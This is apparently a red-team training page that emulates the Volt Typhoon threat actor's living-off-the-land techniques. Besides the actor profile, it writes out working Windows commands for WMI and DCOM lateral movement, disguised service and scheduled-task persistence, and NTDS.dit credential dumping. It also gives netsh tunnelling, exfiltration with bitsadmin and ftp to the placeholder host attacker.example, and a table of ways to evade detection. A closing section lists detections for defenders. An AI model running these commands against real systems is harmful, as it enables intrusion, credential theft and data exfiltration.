---
layout: training-page
title: "Volt Typhoon LOTL Emulation — Red Team Academy"
module: "Threat Actor Emulation"
tags:
  - volt-typhoon
  - prc
  - china
  - critical-infrastructure
  - living-off-the-land
  - ot-targeting
page_key: "threat-actors-volt-typhoon"
render_with_liquid: false
---

# Volt Typhoon LOTL (Living off the Land) Emulation

Volt Typhoon (also: Bronze Silhouette, Dev-0391, Vanguard Panda) is a PRC state-sponsored actor whose primary mission is pre-positioning within US critical infrastructure — not for current intelligence collection, but for future disruption in the event of military conflict. Their defining characteristic: **zero custom malware**. Every action uses built-in Windows tools.

## Attribution

| Attribute | Detail |
|---|---|
| Nation-state | People's Republic of China |
| Organization | MSS (Ministry of State Security) or PLA — disputed |
| MITRE Group ID | G1017 |
| Common aliases | Bronze Silhouette, Vanguard Panda, Dev-0391, VOLTAGE TYPHOON |
| Active since | At least 2021 (Microsoft disclosure), likely 2019+ |
| Key report | CISA/NSA/FBI Advisory AA23-144A (May 2023), Volt Typhoon II advisory (March 2024) |

## Mission Context: Pre-Positioning for Conflict

Unlike most APTs that seek immediate intelligence value, Volt Typhoon's mission is **pre-positioning** — establishing persistent, stealthy access to:
- US electricity generation and distribution infrastructure
- Water treatment facilities
- Communications (telecom, internet infrastructure)
- Transportation networks (ports, rail, airports)

CISA assesses their purpose is to **enable disruption of logistics and communications in the Pacific theater** in the event of a US-China conflict over Taiwan. They are not stealing intellectual property — they are placing time bombs.

This changes the emulation objective: success is **dwell time** and **undetected persistence**, not achieving a specific data theft objective.

## Defining Characteristic: Pure Living Off the Land

Volt Typhoon uses **no custom malware** in any confirmed intrusion. Every technique uses tools that ship with Windows or are commonly present on enterprise systems:

| Category | Tool Used | MITRE ID |
|---|---|---|
| Execution | `cmd.exe`, `powershell.exe`, `wmic.exe` | T1059.001, T1059.003, T1047 |
| Discovery | `netstat`, `ipconfig`, `systeminfo`, `net`, `nltest` | T1082, T1016, T1069 |
| File operations | `dir`, `copy`, `xcopy`, `robocopy`, `expand` | T1005 |
| Credential access | `ntdsutil`, `vssadmin` | T1003.002, T1003.003 |
| Lateral movement | `wmic`, `sc`, `net use`, `mstsc` | T1021.001, T1021.006 |
| Persistence | `sc.exe`, `schtasks.exe`, `reg.exe` | T1543.003, T1053.005 |
| Network tunneling | `netsh`, `plink.exe` | T1572 |
| Exfiltration | `ftp`, `certutil`, `bitsadmin` | T1048 |

## Initial Access: SOHO Router Exploitation

Volt Typhoon gains initial access by exploiting vulnerabilities in SOHO (Small/Home Office) routers, VPN appliances, and network edge devices — specifically devices at or near critical infrastructure facilities.

**Confirmed exploited devices:**
- Cisco RV320/RV325 (CVE-2019-1653, CVE-2019-1652)
- Netgear ProSAFE (multiple CVEs)
- Fortinet FortiOS VPN (CVE-2022-42475, CVE-2023-27997)
- Zyxel firewalls (CVE-2022-30525)
- Citrix NetScaler (CVE-2023-4966, Citrix Bleed)
- F5 BIG-IP (CVE-2023-46747)

**Why SOHO routers?**
- Often unpatched and unmonitored
- Located at the network perimeter of OT environments
- Have network visibility into both IT and OT networks
- May be directly connected to SCADA/ICS systems

## The KV Botnet: SOHO Router Relay Network

Volt Typhoon operates the **KV Botnet** — a network of compromised SOHO routers used as encrypted relay infrastructure. Traffic from Volt Typhoon to victim networks passes through KV Botnet nodes (compromised Cisco, Netgear, Zyxel, and ASUS routers belonging to innocent parties), making attribution and blocking nearly impossible.

```
[Volt Typhoon operator] → [KV Botnet node 1] → [KV Botnet node 2] → [Target network]
  (PRC IP)                 (US home router)       (US small business)   (US critical infra)
```

The KV Botnet was partially dismantled by FBI/DOJ in January 2024 via court-authorized remote remediation (deleting Volt Typhoon's files from compromised routers).

## Execution: Built-in Windows Tools Only

### T1059.001 — PowerShell

```powershell
# Volt Typhoon-style PowerShell reconnaissance (observed patterns)
# All built-in cmdlets — no external tools imported

# Network discovery
Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias, AddressFamily
Get-NetRoute | Where-Object { $_.DestinationPrefix -ne "0.0.0.0/0" }
Get-NetNeighbor | Where-Object { $_.State -eq "Reachable" }

# Local users and groups
Get-LocalUser | Select-Object Name, Enabled, LastLogon
Get-LocalGroupMember -Group "Administrators"

# Running services
Get-Service | Where-Object { $_.Status -eq "Running" } | 
    Select-Object Name, DisplayName, StartType

# Installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Select-Object DisplayName, DisplayVersion, Publisher
```

### T1059.003 — cmd.exe for Discovery

```cmd
:: Volt Typhoon documented command sequence (from CISA advisory)
:: Run via compromised edge device foothold

:: Network topology mapping
ipconfig /all
route print
arp -a
netstat -ano
nslookup . 127.0.0.1

:: Domain discovery via native tools
net group "Domain Admins" /domain
net group "Domain Computers" /domain
nltest /domain_trusts
nltest /dclist:corp.example.com

:: System information
systeminfo
wmic os get Caption,Version,BuildNumber
wmic computersystem get Name,Domain,Manufacturer,Model,NumberOfProcessors
wmic logicaldisk get DeviceID,FileSystem,Size,FreeSpace

:: Enumerate domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.example.com
```

### T1047 — WMI for Remote Execution

```cmd
:: WMI remote process execution — no PsExec, no external tool
:: T1047 — WMI
wmic /node:"TARGET-HOST" /user:"DOMAIN\Administrator" /password:"Password123!" ^
    process call create "cmd.exe /c ipconfig /all > C:\Windows\Temp\net_info.txt"

:: Read result via WMI file access
wmic /node:"TARGET-HOST" datafile where name="C:\\Windows\\Temp\\net_info.txt" ^
    get read
```

## Persistence

### T1543.003 — Windows Service

```cmd
:: Create a service using sc.exe — name mimics legitimate Windows services
:: T1543.003 — Create or Modify System Process: Windows Service
sc create "WinHttpAutoProxySvc2" ^
    binPath= "C:\Windows\System32\svchost.exe -k netsvcs" ^
    DisplayName= "WinHTTP Web Proxy Auto-Discovery Service" ^
    start= auto ^
    type= share

:: Install a malicious DLL loaded by svchost via ServiceDLL registry value
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc2\Parameters" ^
    /v ServiceDll /t REG_EXPAND_SZ ^
    /d "C:\Windows\System32\legitimate-looking-name.dll" /f
```

### T1053.005 — Scheduled Tasks

```powershell
# Volt Typhoon scheduled task persistence — task names mimic system tasks
schtasks /Create /TN "Microsoft\Windows\Maintenance\AdobeAcrobatUpdate" `
    /TR "C:\Windows\System32\cmd.exe /c whoami >> C:\Windows\Temp\beacon.log" `
    /SC HOURLY /RU SYSTEM /F

# Detection: Sysmon Event 1, parent schtasks.exe
# SIGMA: proc_creation_win_schtasks_susp_parent.yml
```

## Discovery: Extensive Reconnaissance with Native Tools

Volt Typhoon performs methodical network and system reconnaissance before any lateral movement — building a complete picture of the environment using only built-in tools.

```cmd
:: Full Volt Typhoon documented recon sequence (composite from CISA advisory)
:: Phase 1: Local system
whoami /all                           :: current user + privileges
hostname                              :: system name
systeminfo                            :: OS, patches, domain, hardware
wmic computersystem get *             :: hardware details
wmic bios get *                       :: BIOS (OT equipment often identified by BIOS)
wmic nic get *                        :: all network adapters

:: Phase 2: Network topology  
ipconfig /all                         :: all IP configuration
route print                           :: routing table
netstat -ano                          :: all connections with PIDs
arp -a                                :: ARP cache (nearby hosts)
nslookup -type=MX corp.example.com   :: mail servers (useful for targeting)

:: Phase 3: Domain enumeration
net view /domain                      :: list domains
net group /domain                     :: list domain groups  
net group "Domain Controllers" /domain :: find DCs
net user /domain                      :: list domain users
dsquery * -filter "(objectClass=computer)" -attr dNSHostName description :: all computers

:: Phase 4: OT/ICS-specific discovery
:: Identify SCADA historian, HMI, engineering workstations
net view                              :: list shares on local network
nslookup historian                    :: find OSIsoft PI historian
ping -n 1 hmi-workstation            :: verify connectivity to HMI
```

## Lateral Movement: Admin Tools Only

Volt Typhoon's lateral movement avoids any tool that requires download. All movement uses native Windows remote administration:

```powershell
# RDP for interactive access (T1021.001)
mstsc /v:TARGET-HOST /w:1024 /h:768

# SMB for file operations (T1021.002)
net use \\TARGET-HOST\C$ /user:DOMAIN\Administrator Password123!
copy C:\implant.exe \\TARGET-HOST\C$\Windows\Temp\
net use \\TARGET-HOST\C$ /delete

# WMI for command execution (T1021.006 + T1047)
$wmi = [wmiclass]"\\TARGET-HOST\root\cimv2:Win32_Process"
$wmi.Create("cmd.exe /c net group ""Domain Admins"" /domain")

# DCOM for lateral movement (T1021.003)
$dcom = [Activator]::CreateInstance([Type]::GetTypeFromCLSID(
    [Guid]"9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET-HOST"))
$dcom.item().Create("cmd.exe /c ipconfig > c:\windows\temp\t.txt", "c:\", $null, 0)
```

## Credential Access

### T1003.002 — NTDS.dit via ntdsutil

```cmd
:: Export NTDS.dit using ntdsutil — built-in Windows database utility
:: T1003.002 — OS Credential Dumping: Security Account Manager
ntdsutil "ac i ntds" "ifm" "create full c:\Windows\Temp\ntds_export" q q

:: Copies NTDS.dit + SYSTEM hive to specified path
:: Operator then copies these files to attacker infrastructure
:: Parse offline with secretsdump.py (Impacket) or DSInternals

:: Via Volume Shadow Copy (T1003.003 — NTDS)
vssadmin create shadow /for=C:
:: then copy NTDS.dit from shadow copy path
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\
```

## Network Tunneling: Encrypted Relay via Built-in Tools

### T1572 — Protocol Tunneling with netsh

```cmd
:: netsh portproxy: create a port forwarding rule
:: Relay attacker traffic through compromised host to internal network
:: T1572 — Protocol Tunneling

:: Forward all connections to attacker:443 to internal target:22
netsh interface portproxy add v4tov4 ^
    listenport=8443 listenaddress=0.0.0.0 ^
    connectport=22 connectaddress=192.168.100.50

:: List active portproxy rules
netsh interface portproxy show all

:: Remove when done
netsh interface portproxy reset
```

## Exfiltration: Built-in Transfer Tools

```cmd
:: BITS transfer (T1048.003 — background download/upload blends with Windows Update)
bitsadmin /transfer "WindowsUpdate" /priority normal ^
    https://attacker.example/upload ^
    C:\Windows\Temp\collected_data.zip

:: certutil as base64 encoder for data exfil (T1132.001)
certutil -encode C:\Windows\Temp\collected_data.zip C:\Windows\Temp\data.b64
:: Then exfil data.b64 via web request blending with normal traffic

:: FTP (T1048) — built-in ftp.exe
echo open attacker.example 21 > C:\Windows\Temp\ftp_cmds.txt
echo user ops_user P@ssword >> C:\Windows\Temp\ftp_cmds.txt
echo binary >> C:\Windows\Temp\ftp_cmds.txt
echo put collected_data.zip >> C:\Windows\Temp\ftp_cmds.txt
echo quit >> C:\Windows\Temp\ftp_cmds.txt
ftp -s:C:\Windows\Temp\ftp_cmds.txt
del C:\Windows\Temp\ftp_cmds.txt
```

## Emulation Challenges: Avoiding Behavioral Analytics

The hardest part of emulating Volt Typhoon is avoiding detection while using only built-in tools — because **defenders have behavioral analytics specifically for LOTL abuse**:

| LOTL Tool | Common Detection Rule | Evasion Required |
|---|---|---|
| `netsh portproxy` | Sysmon registry event on PortProxy key | Timing: make change during maintenance window |
| `wmic process call create` | WMI event subscription monitoring | Use low-frequency, blend with normal WMI |
| `ntdsutil` | Process creation with "ifm" arguments | Rename arguments, or use VSS shadow copy |
| `bitsadmin /transfer` | BITS job to external IP | Use HTTPS to CDN IP (proxy to attacker) |
| `vssadmin create shadow` | VSS events + subsequent NTDS.dit access | Immediately delete shadow after copy |
| `net use` (lateral) | Explicit logon Event 4648 | Use existing authenticated sessions |
| PowerShell `Get-Net*` | PowerShell Script Block Logging | Use `-NonInteractive -WindowStyle Hidden -ep bypass` |

## Recommended Detection Engineering Focus for Blue Teams

Volt Typhoon is specifically designed to defeat signature-based detection. Detection requires **behavioral baselining**:

```
1. Baseline all netsh portproxy rules — alert on any NEW rule
2. Baseline all scheduled tasks — alert on any NEW task not in your baseline
3. Alert on ntdsutil with "ifm" arguments from any process
4. Alert on vssadmin creating shadow + subsequent file copy of ntds.dit
5. Alert on net.exe discovery chains (net view → net group → net user in sequence)
6. Alert on WMI remote process creation from unexpected source hosts
7. Network: Alert on outbound FTP or BITS jobs to non-approved destinations
8. Log all PowerShell commands (Script Block Logging enabled)
```

## References

- MITRE ATT&CK G1017 (Volt Typhoon): attack.mitre.org/groups/G1017/
- CISA Advisory AA23-144A (May 2023): cisa.gov/news-events/cybersecurity-advisories/aa23-144a
- CISA Volt Typhoon II (March 2024): cisa.gov
- NSA/CISA/ONCD "Shifting the Balance" guidance on LOTL
- Microsoft blog: Volt Typhoon targets US critical infrastructure
- Secureworks BRONZE SILHOUETTE analysis
- KV Botnet DOJ court documents (January 2024)
